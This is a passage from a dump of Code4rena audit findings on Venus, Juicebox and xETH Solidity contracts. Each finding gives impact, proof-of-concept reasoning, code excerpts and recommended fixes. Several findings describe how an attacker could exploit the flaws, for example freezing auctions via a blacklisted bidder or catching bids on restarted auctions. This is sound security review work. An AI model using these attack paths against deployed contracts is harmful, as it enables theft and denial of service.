ChatGPT 4  ## Recommended Mitigation Steps  Update the `preLiquidateHook` function to check if a user has exited a market before proceeding with liquidation.     ## Assessed type  Invalid Validation"}, {"title": "ShortFall contract might transfer incorrect amount of tokens to the highest bidder.", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/222", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Shortfall/Shortfall.sol#L248   # Vulnerability details  ### Impact  There might be an incorrect amount of transfer possible if `convertibleBaseAsset` is not a token which is pegged to USD.   ### Details  There is not much information on what `convertibleBaseAsset` is supposed to be, if it is a token which is not pegged to USD then the auction process might transfer wrong amount of tokens or entirely wrong tokens.  Let\u2019s take an example of `LARGE_RISK_FUND` type of auction for simplicity. Assuming the `convertibleBaseAsset` is not a token pegged to USD (let\u2019s take it as BNB for this case)  Now the calculation of poolBadDebt is calculated by converting the badDebt to usd terms in the code below:  ```solidity for (uint256 i; i < marketsCount; ++i) {             uint256 marketBadDebt = vTokens[i].badDebt();              priceOracle.updatePrice(address(vTokens[i]));             uint256 usdValue = (priceOracle.getUnderlyingPrice(address(vTokens[i])) * marketBadDebt) / 1e18;              poolBadDebt = poolBadDebt + usdValue;             auction.markets[i] = vTokens[i];             auction.marketDebt[vTokens[i]] = marketBadDebt;             marketsDebt[i] = marketBadDebt;         } ```  In this case the auction properties would be as follows:  ```solidity auction.seizedRiskFund = incentivizedRiskFundBalance; auction.startBlock = block.number; auction.status = AuctionStatus.STARTED; auction.highestBidder = address(0); ```  Where `incentivizedRiskFundBalance` = `poolBadDebt + ((poolBadDebt * incentiveBps) / MAX_BPS);`   ```solidity function closeAuction(address comptroller) external nonReentrant {         Auction storage auction = auctions[comptroller];     // ...         if (auction.auctionType == AuctionType.LARGE_POOL_DEBT) {             riskFundBidAmount = auction.seizedRiskFund;         } else {             riskFundBidAmount = (auction.seizedRiskFund * auction.highestBidBps) / MAX_BPS;         }          uint256 transferredAmount = riskFund.transferReserveForAuction(comptroller, riskFundBidAmount);         IERC20Upgradeable(convertibleBaseAsset).safeTransfer(auction.highestBidder, riskFundBidAmount);      } ```  When the `closeAuction`  is called the contract will transfer the `riskFundBidAmount` of `convertibleBaseAsset` to the highest bidder. Here if the `convertibleBaseAsset` token is not a token pegged to USD, it will transfer those tokens to the highest bidder, where it should have transferred the tokens that amount to that value.   Eg:  `convertibleBaseAsset` = TokenA (price of this token is $100 per 1e18 tokens)  PoolBadDebt = 200*ie18 which should be equal to 200$ as poolbaddebt is calculated in usd  seizedRiskFund = 220*1e18  Assume the auction type is `LARGE_RISK_FUND` and highestBidBps = 10000.   At the auction complete the tokens transferred to the highestbidder would be :  riskFundBidAmount = 220*1e18  * 10000/10000 = 220*1e18   Actual price of tokens transferred to the highestbidder = 220*100 = 22000$   Token amount that should be transferred = 220$.  Here the tokens is directly transferred before converting them into the terms of `convertibleBaseAsset` which causes the main issue.  ### Recommendation  Before transferring the amount to the highest bidder, ping the oracle for the correct price of `convertibleBaseAsset` and then convert the riskFundBidAmount in the terms of `convertibleBaseAsset` Tokens. Even if a token pegged to USD is used, the oracle should be used to get the correct value AND the tokens should always be converted in terms of  `convertibleBaseAsset` as sometimes the pegged tokens might also divert from their price or decimals might be different for different tokens.   ## Assessed type  Token-Transfer"}, {"title": "Fix utilization rate computation", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/122", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-12"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/8be784ed9752b80e6f1b8b781e2e6251748d0d7e/contracts/BaseJumpRateModelV2.sol#L131   # Vulnerability details  ## Impact The BaseJumpRateModelV2.sol#L131.utilizationRate() function can return value above 1 and not between [0, BASE].  ## Proof of Concept In The BaseJumpRateModelV2.sol#L131.utilizationRate() function, cash and borrows and reserves values gets used to calculate utilization rate between between [0, 1e18]. reserves is currently unused but it will be used in the future.        */     function utilizationRate(         uint256 cash,         uint256 borrows,         uint256 reserves     ) public pure returns (uint256) {         // Utilization rate is 0 when there are no borrows         if (borrows == 0) {             return 0;         }          return (borrows * BASE) / (cash + borrows - reserves);     }  If Borrow value is 0, then function will return 0. but in this function the scenario where the value of reserves exceeds cash is not handled. the system does not guarantee that reserves never exceeds cash. the reserves grow automatically over time, so it might be difficult to avoid this entirely.   If reserves > cash (and borrows + cash - reserves > 0), the formula for utilizationRate above gives a utilization rate above 1.  ## Tools Used Manually  ## Recommended Mitigation Steps Make the utilization rate computation return 1 if reserves > cash.   ## Assessed type  Math"}, {"title": "Comptroller.healAccount doesn't distribute rewards for healed borrower", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/116", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-13"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Comptroller.sol#L578-L626   # Vulnerability details  ## Impact Comptroller.healAccount doesn't distribute rewards for healed borrower. As result healed account receives less rewards.  ## Proof of Concept `Comptroller.healAccount` can be called by anyone in order to fully close account. Healer should repay part of account's debt in order to receive all account's collateral. At the end account debt will be cleared.  This is the part when collateral is seized and debt is cleared. https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Comptroller.sol#L611-L625 ```solidity         for (uint256 i; i < userAssetsCount; ++i) {             VToken market = userAssets[i];              (uint256 tokens, uint256 borrowBalance, ) = _safeGetAccountSnapshot(market, user);             uint256 repaymentAmount = mul_ScalarTruncate(percentage, borrowBalance);              // Seize the entire collateral             if (tokens != 0) {                 market.seize(liquidator, user, tokens);             }             // Repay a certain percentage of the borrow, forgive the rest             if (borrowBalance != 0) {                 market.healBorrow(liquidator, user, repaymentAmount);             }         } ```  In order to seize collateral, `market.seize` is called, which will then [call `comptroller.preSeizeHook`](https://github.com/code-423n4/2023-05-venus/blob/main/contracts/VToken.sol#L1104). And this hook [will distribute supply rewards](https://github.com/code-423n4/2023-05-venus/blob/main/contracts/Comptroller.sol#L521-L525) to both accounts.  In order to clear healed account debt `market.healBorrow` is called. This function [will not call any comptroller function](https://github.com/code-423n4/2023-05-venus/blob/main/contracts/VToken.sol#L390-L429). As result, debt of healed account is set to 0, but rewards that were earned by account before healing were not distributed to him. So user lost rewards for that debt amount.  ## Tools Used VsCode ## Recommended Mitigation Steps Comptroller should distribute rewards to this account that were earned before and only then set debt to 0.   ## Assessed type  Other"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/69", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-48"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/bin2chen-Q.md)."}, {"title": "closeAuction() A malicious attacker can disable the comptroller Auction mechanism forever", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/65", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/8be784ed9752b80e6f1b8b781e2e6251748d0d7e/contracts/Shortfall/Shortfall.sol#L248   # Vulnerability details  ## Impact Malicious users can prevent closing Auction\uff0c so disable the comptroller Auction mechanism forever  ## Proof of Concept The current protocol is that a `comptroller` can only have one active Auction If there is a way to make it impossible to close an active auction, then the corresponding `comptroller` auction mechanism will be disabled forever  So when is it impossible to close an auction? Let's look at the code of `closeAuction()`.  ```solidity     function closeAuction(address comptroller) external nonReentrant {         Auction storage auction = auctions[comptroller];          require(_isStarted(auction), \"no on-going auction\");         require(             block.number > auction.highestBidBlock + nextBidderBlockLimit && auction.highestBidder != address(0),             \"waiting for next bidder. cannot close auction\"         ); ...          uint256 transferredAmount = riskFund.transferReserveForAuction(comptroller, riskFundBidAmount);         IERC20Upgradeable(convertibleBaseAsset).safeTransfer(auction.highestBidder, riskFundBidAmount);   //<----if highestBidder in usdc's blacklist      ```  As we can see from the above code, closing will transfer `convertibleBaseAsset` to `highestBidder`. If `highestBidder` enters the blacklist of the `convertibleBaseAsset` (eg:usdc's blacklist) it will directly revert This will make it impossible to close the auction, and the `comptroller` auction mechanism will fail forever  Suppose the attacker alice 1. participate in the auction such as: action={type=LARGE_POOL_DEBT},alice bidBps = MAX_BPS or  auction={type=LARGE_RISK_FUND},alice bidBps = 0% so that alice is always the highest, can not be replaced  2. alice finds a way to get on usdc's blacklist (do something bad, or alice is already on usdc's blacklist, as long as the vToken's asset is not usdc)  3. anyone must first close the auction to restart, but when closed,it will revert , alice is the highest bidder can not be replaced. So this comptroller will be permanently invalid  So it is recommended.  `convertibleBaseAsset` should use try/catch when trasnfer, if it fails, record:`claimToken[convertibleBaseAsset][highestBidder] +=riskFundBidAmount`, so that can close the action normally, and then the user can claim the token later  ## Tools Used  ## Recommended Mitigation Steps  `convertibleBaseAsset` should use try/catch when trasnfer, if it fails, record:`claimToken[convertibleBaseAsset][highestBidder] +=riskFundBidAmount`, so that can close the action normally, and then the user can claim the token later   ## Assessed type  DoS"}, {"title": "placeBid() Possible participation in auctions that have been modified", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/62", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-14"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/8be784ed9752b80e6f1b8b781e2e6251748d0d7e/contracts/Shortfall/Shortfall.sol#L158   # Vulnerability details  ## Impact `placeBid()` Lack of checking if auction are restarted and participating in auction that are not expected by the user may result in the user losing funds  ## Proof of Concept When the user makes a bid, simply pass in `comptroller` and `bidBps` with the following code:  ```solidity     function placeBid(address comptroller, uint256 bidBps) external nonReentrant {         Auction storage auction = auctions[comptroller];          require(_isStarted(auction), \"no on-going auction\");         require(!_isStale(auction), \"auction is stale, restart it\");         require(bidBps <= MAX_BPS, \"basis points cannot be more than 10000\"); ```  Because `comptroller` corresponds to the `Auction` there are two cases that will generate new `Auction` (the new one and the old one may have completely different types and amounts)  1. If the first auction takes too long and no one bids `_isStale()` you can restart the auction 2. If the auction ends and the last bid time `> nextBidderBlockLimit`, then you can restart the auction after it ends  Since bidding can be restarted, so `placeBid()` is only based on `comptroller`, it may be possible to participate in the old `Auction` but end up participating in the new `Auction`, as the old and new `Auction` may be very different, resulting in the user losing money.  For example, the following scenario  1. Alice learns about the auction in the UI, auctions = {type=LARGE_RISK_FUND,debt=100,seizedRiskFund=100} and submits it to participate in the auction 2. When alice commits, her transaction will exist in memorypool  Note: Because alice needs to stay in the UI interface for some time, or because of the GAS price and block size, alice transaction is delayed, resulting in a much higher possibility of preemptive execution in step 3  3. The auction is restarted due to any of the following situations (before alice's task is executed)  a) auction `>waitForFirstBidder` leads to `_isStale()`, bob executes restarted auction, restarted auction debt increases e.g.: auction = {type=LARGE_POOL_DEBT,debt=100000,seizedRiskFund=100}  b) The auction ends `> nextBidderBlockLimit`, bob restarts the auction, the restarted auction `seizedRiskFund` becomes small, like 0, the debt is already very high as auction = {type=LARGE_POOL_DEBT,debt=100,seizedRiskFund=0}, there may also be still `LARGE_RISK_FUND`  4. alice's turn to execute the transaction, this time the new auction and alice expected has been much worse, but the transaction will still be executed. The result is that alice may pay a lot of debt, but get very little `seizedRiskFund`.  So, we need to add a restriction to `placeBid()` to ensure that the auction has not been restarted when the transaction is executed.  A simple way to do this is to add the parameter : `auctionStartBlock`, and compare it to the `auction.startBlock` of the current transaction, if the two are different, then the auction has been restarted and the transaction revert  ## Tools Used  ## Recommended Mitigation Steps  ```solidity -   function placeBid(address comptroller, uint256 bidBps) external nonReentrant { +   function placeBid(address comptroller, uint256 bidBps , uint256 auctionStartBlock) external nonReentrant {             Auction storage auction = auctions[comptroller];  +       require(auction.startBlock == auctionStartBlock,\"auction has been restarted\");         require(_isStarted(auction), \"no on-going auction\");         require(!_isStale(auction), \"auction is stale, restart it\");         require(bidBps <= MAX_BPS, \"basis points cannot be more than 10000\"); ```   ## Assessed type  Context"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "grade-a", "sponsor confirmed", "edited-by-warden", "G-27"], "target": "2023-05-venus-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-venus-findings/blob/main/data/Sathish9098-G.md)."}, {"title": "Sometimes calculateBorrowerReward and calculateSupplierReward return incorrect results", "html_url": "https://github.com/code-423n4/2023-05-venus-findings/issues/9", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-16"], "target": "2023-05-venus-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-venus/blob/9853f6f4fe906b635e214b22de9f627c6a17ba5b/contracts/Lens/PoolLens.sol#L506   # Vulnerability details  ## Impact Detailed description of the impact of this finding. Sometimes calculateBorrowerReward and calculateSupplierReward return incorrect results ## Proof of Concept Provide direct links to all referenced code in GitHub. Add screenshots, logs, or any other relevant proof that illustrates the concept. Whenever user wants to know his pending rewards he calls `getPendingRewards` sometimes it returns incorrect results.  There is a bug inside `calculateBorrowerReward` and `calculateSupplierReward` ```solidity     function calculateBorrowerReward(         address vToken,         RewardsDistributor rewardsDistributor,         address borrower,         RewardTokenState memory borrowState,         Exp memory marketBorrowIndex     ) internal view returns (uint256) {         Double memory borrowIndex = Double({ mantissa: borrowState.index });         Double memory borrowerIndex = Double({             mantissa: rewardsDistributor.rewardTokenBorrowerIndex(vToken, borrower)         }); //      @audit //        if (borrowerIndex.mantissa == 0 && borrowIndex.mantissa >= rewardsDistributor.rewardTokenInitialIndex()) {         if (borrowerIndex.mantissa == 0 && borrowIndex.mantissa > 0) {             // Covers the case where users borrowed tokens before the market's borrow state index was set             borrowerIndex.mantissa = rewardsDistributor.rewardTokenInitialIndex();         }         Double memory deltaIndex = sub_(borrowIndex, borrowerIndex);         uint256 borrowerAmount = div_(VToken(vToken).borrowBalanceStored(borrower), marketBorrowIndex);         uint256 borrowerDelta = mul_(borrowerAmount, deltaIndex);         return borrowerDelta;     }  ``` [contracts/Lens/PoolLens.sol#L495](https://github.com/code-423n4/2023-05-venus/blob/9853f6f4fe906b635e214b22de9f627c6a17ba5b/contracts/Lens/PoolLens.sol#L495)  ```solidity     function calculateSupplierReward(         address vToken,         RewardsDistributor rewardsDistributor,         address supplier,         RewardTokenState memory supplyState     ) internal view returns (uint256) {         Double memory supplyIndex = Double({ mantissa: supplyState.index });         Double memory supplierIndex = Double({             mantissa: rewardsDistributor.rewardTokenSupplierIndex(vToken, supplier)         }); //      @audit //        if (supplierIndex.mantissa == 0 && supplyIndex.mantissa  >= rewardsDistributor.rewardTokenInitialIndex()) {         if (supplierIndex.mantissa == 0 && supplyIndex.mantissa > 0) {             // Covers the case where users supplied tokens before the market's supply state index was set             supplierIndex.mantissa = rewardsDistributor.rewardTokenInitialIndex();         }         Double memory deltaIndex = sub_(supplyIndex, supplierIndex);         uint256 supplierTokens = VToken(vToken).balanceOf(supplier);         uint256 supplierDelta = mul_(supplierTokens, deltaIndex);         return supplierDelta;     }  ``` [contracts/Lens/PoolLens.sol#L516](https://github.com/code-423n4/2023-05-venus/blob/9853f6f4fe906b635e214b22de9f627c6a17ba5b/contracts/Lens/PoolLens.sol#L516)  Inside rewardsDistributor original functions written likes this ```solidity     function _distributeSupplierRewardToken(address vToken, address supplier) internal { ...         if (supplierIndex == 0 && supplyIndex >= rewardTokenInitialIndex) {             // Covers the case where users supplied tokens before the market's supply state index was set.             // Rewards the user with REWARD TOKEN accrued from the start of when supplier rewards were first             // set for the market.             supplierIndex = rewardTokenInitialIndex;         } ...     } ``` [contracts/Rewards/RewardsDistributor.sol#L340](https://github.com/code-423n4/2023-05-venus/blob/9853f6f4fe906b635e214b22de9f627c6a17ba5b/contracts/Rewards/RewardsDistributor.sol#L340)  ```solidity     function _distributeBorrowerRewardToken(         address vToken,         address borrower,         Exp memory marketBorrowIndex     ) internal { ...         if (borrowerIndex == 0 && borrowIndex >= rewardTokenInitialIndex) {             // Covers the case where users borrowed tokens before the market's borrow state index was set.             // Rewards the user with REWARD TOKEN accrued from the start of when borrower rewards were first             // set for the market.             borrowerIndex = rewardTokenInitialIndex;         } ... } ``` [Rewards/RewardsDistributor.sol#L374](https://github.com/code-423n4/2023-05-venus/blob/9853f6f4fe906b635e214b22de9f627c6a17ba5b/contracts/Rewards/RewardsDistributor.sol#L374) ## Tools Used  ## Recommended Mitigation Steps  ```diff     function calculateSupplierReward(         address vToken,         RewardsDistributor rewardsDistributor,         address supplier,         RewardTokenState memory supplyState     ) internal view returns (uint256) {         Double memory supplyIndex = Double({ mantissa: supplyState.index });         Double memory supplierIndex = Double({             mantissa: rewardsDistributor.rewardTokenSupplierIndex(vToken, supplier)         }); -        if (supplierIndex.mantissa == 0 && supplyIndex.mantissa > 0) { +        if (supplierIndex.mantissa == 0 && supplyIndex.mantissa  >= rewardsDistributor.rewardTokenInitialIndex()) {             // Covers the case where users supplied tokens before the market's supply state index was set             supplierIndex.mantissa = rewardsDistributor.rewardTokenInitialIndex();         }         Double memory deltaIndex = sub_(supplyIndex, supplierIndex);         uint256 supplierTokens = VToken(vToken).balanceOf(supplier);         uint256 supplierDelta = mul_(supplierTokens, deltaIndex);         return supplierDelta;     } ``` ```diff     function calculateBorrowerReward(         address vToken,         RewardsDistributor rewardsDistributor,         address borrower,         RewardTokenState memory borrowState,         Exp memory marketBorrowIndex     ) internal view returns (uint256) {         Double memory borrowIndex = Double({ mantissa: borrowState.index });         Double memory borrowerIndex = Double({             mantissa: rewardsDistributor.rewardTokenBorrowerIndex(vToken, borrower)         }); -        if (borrowerIndex.mantissa == 0 && borrowIndex.mantissa > 0) { +        if (borrowerIndex.mantissa == 0 && borrowIndex.mantissa >= rewardsDistributor.rewardTokenInitialIndex()) {             // Covers the case where users borrowed tokens before the market's borrow state index was set             borrowerIndex.mantissa = rewardsDistributor.rewardTokenInitialIndex();         }         Double memory deltaIndex = sub_(borrowIndex, borrowerIndex);         uint256 borrowerAmount = div_(VToken(vToken).borrowBalanceStored(borrower), marketBorrowIndex);         uint256 borrowerDelta = mul_(borrowerAmount, deltaIndex);         return borrowerDelta;     } ```   ## Assessed type  Invalid Validation"}, {"title": "Low Liquidity in Uniswap V3 Pool Can Lead to ETH Lockup in `JBXBuybackDelegate` Contract", "html_url": "https://github.com/code-423n4/2023-05-juicebox-findings/issues/162", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-05-juicebox-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-juicebox/blob/9a36e5c8d0588f0f262a0cd1c08e34b2184d8f4d/juice-buyback/contracts/JBXBuybackDelegate.sol#L216   # Vulnerability details  ## Impact  The `JBXBuybackDelegate` contract employs Uniswap V3 to perform ETH-to-project token swaps. When the terminal invokes the `JBXBuybackDelegate.didPay()` function, it provides the amount of ETH to be swapped for project tokens. The swap operation sets `sqrtPriceLimitX96` to the lowest possible price, and the slippage is checked at the callback.  However, if the Uniswap V3 pool lacks sufficient liquidity or being manipulated before the transaction is executed, the swap will halt once the pool's price reaches the `sqrtPriceLimitX96` value. Consequently, not all the ETH sent to the contract will be utilized, resulting in the remaining ETH becoming permanently locked within the contract.  ## Proof of Concept  The `_swap()` function interacts with the Uniswap V3 pool. It sets `sqrtPriceLimitX96` to the minimum or maximum feasible value to ensure that the swap attempts to utilize all available liquidity in the pool.  ```solidity try pool.swap({     recipient: address(this),     zeroForOne: !_projectTokenIsZero,     amountSpecified: int256(_data.amount.value),     sqrtPriceLimitX96: _projectTokenIsZero ? TickMath.MAX_SQRT_RATIO - 1 : TickMath.MIN_SQRT_RATIO + 1,     data: abi.encode(_minimumReceivedFromSwap) }) returns (int256 amount0, int256 amount1) {     // Swap succeeded, take note of the amount of projectToken received (negative as it is an exact input)     _amountReceived = uint256(-(_projectTokenIsZero ? amount0 : amount1)); } catch {     // implies _amountReceived = 0 -> will later mint when back in didPay     return _amountReceived; } ```  In the Uniswap V3 pool, [this check](https://github.com/Uniswap/v3-core/blob/main/contracts/UniswapV3Pool.sol#LL640C9-L650C15) stops the loop if the price limit is reached or the entire input has been used. If the pool does not have enough liquidity, it will still do the swap until the price reaches the minimum/maximum price.  ```solidity // continue swapping as long as we haven't used the entire input/output and haven't reached the price limit while (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {     StepComputations memory step;      step.sqrtPriceStartX96 = state.sqrtPriceX96;      (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(         state.tick,         tickSpacing,         zeroForOne     ); ```  Finally, the `uniswapV3SwapCallback()` function uses the input from the pool callback to wrap ETH and transfer WETH to the pool. So, if `_amountToSend < msg.value`, the unused ETH is locked in the contract.  ```solidity function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external override {     // Check if this is really a callback     if (msg.sender != address(pool)) revert JuiceBuyback_Unauthorized();      // Unpack the data     (uint256 _minimumAmountReceived) = abi.decode(data, (uint256));      // Assign 0 and 1 accordingly     uint256 _amountReceived = uint256(-(_projectTokenIsZero ? amount0Delta : amount1Delta));     uint256 _amountToSend = uint256(_projectTokenIsZero ? amount1Delta : amount0Delta);      // Revert if slippage is too high     if (_amountReceived < _minimumAmountReceived) revert JuiceBuyback_MaximumSlippage();      // Wrap and transfer the weth to the pool     weth.deposit{value: _amountToSend}();     weth.transfer(address(pool), _amountToSend); } ```  ## Tools Used  Manual Review  ## Recommended Mitigation Steps  Consider returning the amount of unused ETH to the beneficiary.     ## Assessed type  Other"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-juicebox-findings/issues/141", "labels": ["bug", "G (Gas Optimization)", "grade-a", "high quality report", "selected for report", "sponsor confirmed", "G-07"], "target": "2023-05-juicebox-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-juicebox-findings/blob/main/data/JCN-G.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-juicebox-findings/issues/86", "labels": ["bug", "grade-a", "high quality report", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "edited-by-warden", "Q-42"], "target": "2023-05-juicebox-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-juicebox-findings/blob/main/data/ABA-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/36", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-01"], "target": "2023-05-xeth-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-xeth-findings/blob/main/data/d3e4-Q.md)."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/34", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "sponsor confirmed", "G-02"], "target": "2023-05-xeth-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-xeth-findings/blob/main/data/adriro-G.md)."}, {"title": "Inconsistent check for LP balance in AMO", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/33", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-02"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/main/src/AMO2.sol#L256-L259 https://github.com/code-423n4/2023-05-xeth/blob/main/src/AMO2.sol#L600-L604 https://github.com/code-423n4/2023-05-xeth/blob/main/src/AMO2.sol#L632-L636   # Vulnerability details  # Inconsistent check for LP balance in AMO  While pulling LP tokens from the CVXStaker contract, the AMO queries the current available balance using the staked balance, which is inconsistent with the implementation of the withdraw function.  ## Impact  Curve LP tokens owned by the AMO contract are staked in a Convex pool that is handled using the CVXStaker contract. When liquidity needs to be removed from the Curve pool, the AMO contract needs to first withdraw the LP tokens from the CVXStaker contract.  The `rebalanceUp()`, `removeLiquidity()` and `removeLiquidityOnlyStETH()` functions present in the AMO contract deal with removing liquidity from the Curve pool. In their implementations, all of them query the available LP balance using the `stakedBalance()` function of CVXStaker. Taking the `rebalanceUp()` function as an example (other cases are similar), we can see the following:  https://github.com/code-423n4/2023-05-xeth/blob/main/src/AMO2.sol#L256-L261  ```solidity ... 256:         uint256 amoLpBal = cvxStaker.stakedBalance(); 257:  258:         // if (amoLpBal == 0 || quote.lpBurn > amoLpBal) revert LpBalanceTooLow(); 259:         if (quote.lpBurn > amoLpBal) revert LpBalanceTooLow(); 260:  261:         cvxStaker.withdrawAndUnwrap(quote.lpBurn, false, address(this)); ... ```  The implementation of `stakedBalance()` basically delegates the call to fetch the staked balance in the Convex reward pool contract:  https://github.com/code-423n4/2023-05-xeth/blob/main/src/CVXStaker.sol#L204-L206  ```solidity 204:     function stakedBalance() public view returns (uint256 balance) { 205:         balance = IBaseRewardPool(cvxPoolInfo.rewards).balanceOf(address(this)); 206:     } ```  However, this check is not correct. As we can see in the implementation of `withdrawAndUnwrap()`, the CVXStaker contract consider not only staked tokens, **but also available balance held in the contract itself**:  https://github.com/code-423n4/2023-05-xeth/blob/main/src/CVXStaker.sol#L142-L161  ```solidity 142:     function withdrawAndUnwrap( 143:         uint256 amount, 144:         bool claim, 145:         address to 146:     ) external onlyOperatorOrOwner { 147:         // Optimistically use CLP balance in this contract, and then try and unstake any remaining 148:         uint256 clpBalance = clpToken.balanceOf(address(this)); 149:         uint256 toUnstake = (amount < clpBalance) ? 0 : amount - clpBalance; 150:         if (toUnstake > 0) { 151:             IBaseRewardPool(cvxPoolInfo.rewards).withdrawAndUnwrap( 152:                 toUnstake, 153:                 claim 154:             ); 155:         } 156:  157:         if (to != address(0)) { 158:             // unwrapped amount is 1 to 1 159:             clpToken.safeTransfer(to, amount); 160:         } 161:     } ```  Line 148 considers potentially available LP tokens in the contract, and withdraws the remaining amount from Convex.   This means that checking against `stakedBalance()` is too restrictive and incorrect, and can potentially lead to situations in which the required LP tokens are enough, but the check in line 259 of the AMO contract will revert the operation.  ## Proof of concept  As an example, let's take a call to the `rebalanceUp()` function and assume that the quoted `lpBurn` amount is 4. The CVXStaker contract has 3 LP tokens staked in Convex and 2 tokens held as balance in the contract.  In this situation, the condition `quote.lpBurn > amoLpBal` will be true, as `amoLpBal = cvxStaker.stakedBalance() = 3`, which evaluates the condition to `5 > 3`, causing a revert in the transaction.   However, the operation would succeed if the check weren't there, as `withdrawAndUnwrap()` will first consider the 2 tokens already present in the CVXStaker contract and withdraw the remaining 2 from the Convex pool, successfully fulfilling the requested amount.  ## Recommendation  The validation to ensure available LP tokens in `rebalanceUp()`, `removeLiquidity()` and `removeLiquidityOnlyStETH()` should not only consider `stakedBalance()` but also available LP tokens present in the CVXStaker contract. Alternatively, the check can be removed as the call to `withdrawAndUnwrap()` will eventually fail if the available tokens are not enough.    ## Assessed type  Invalid Validation"}, {"title": "Adding locked funds may undercut current stakers rewards due to `drip` being called before totalFunds is increased", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/32", "labels": ["bug", "downgraded by judge", "grade-a", "primary issue", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/main/src/wxETH.sol#L146-L157   # Vulnerability details  # Adding locked funds may undercut current stakers rewards due to `drip` being called before totalFunds is increased  A call to `addLockedFunds()` can potentially undercut staking rewards since the dripping process is triggered before the actual balance of `lockedFunds` is increased.  ## Impact  The wxETH contract works as a vault in which holders of xETH can stake their tokens to earn rewards. These rewards are implemented through a \"dripping\" mechanism in which amounts of xETH provided by the protocol owners (coming from different sources of revenue) are \"dripped\" each block.  After the drip process is started, re-adding funds to the vault can lead to an scenario in which current stakers rewards are undercut due to how the implementation of `addLockedFunds()` works.  https://github.com/code-423n4/2023-05-xeth/blob/main/src/wxETH.sol#L146-L157  ```solidity 146:     function addLockedFunds(uint256 amount) external onlyOwner drip { 147:         /// @dev if amount or _dripRatePerBlock is 0, revert. 148:         if (amount == 0) revert AmountZeroProvided(); 149:  150:         /// @dev transfer xETH from the user to the contract 151:         xETH.safeTransferFrom(msg.sender, address(this), amount); 152:  153:         /// @dev add the amount to the locked funds variable 154:         lockedFunds += amount; 155:  156:         emit LockedFundsAdded(amount, lockedFunds); 157:     } ```  This function implements the `drip` modifier which basically calls `_accrueDrip()` before executing the body of the function:  https://github.com/code-423n4/2023-05-xeth/blob/main/src/wxETH.sol#L222-L256  ```solidity 222:     function _accrueDrip() private { 223:         /// @dev if drip is disabled, no need to accrue 224:         if (!dripEnabled) return; 225:  226:         /// @dev blockDelta is the difference between now and last accrual 227:         uint256 blockDelta = block.number - lastReport; 228:  229:         if (blockDelta != 0) { 230:             /// @dev calculate dripAmount using blockDelta and dripRatePerBlock 231:             uint256 dripAmount = blockDelta * dripRatePerBlock; 232:  233:             /// @dev We can only drip what we have 234:             /// @notice if the dripAmount is greater than the lockedFunds 235:             /// @notice then we set the dripAmount to the lockedFunds 236:             if (dripAmount > lockedFunds) dripAmount = lockedFunds; 237:  238:             /// @dev unlock the dripAmount from the lockedFunds 239:             /// @notice so that it reflects the amount of xETH that is available 240:             /// @notice and the exchange rate shows that 241:             lockedFunds -= dripAmount; 242:  243:             /// @dev set the lastReport to the current block 244:             lastReport = block.number; 245:  246:             /// @notice if there are no remaining locked funds 247:             /// @notice the drip must be stopped. 248:             if 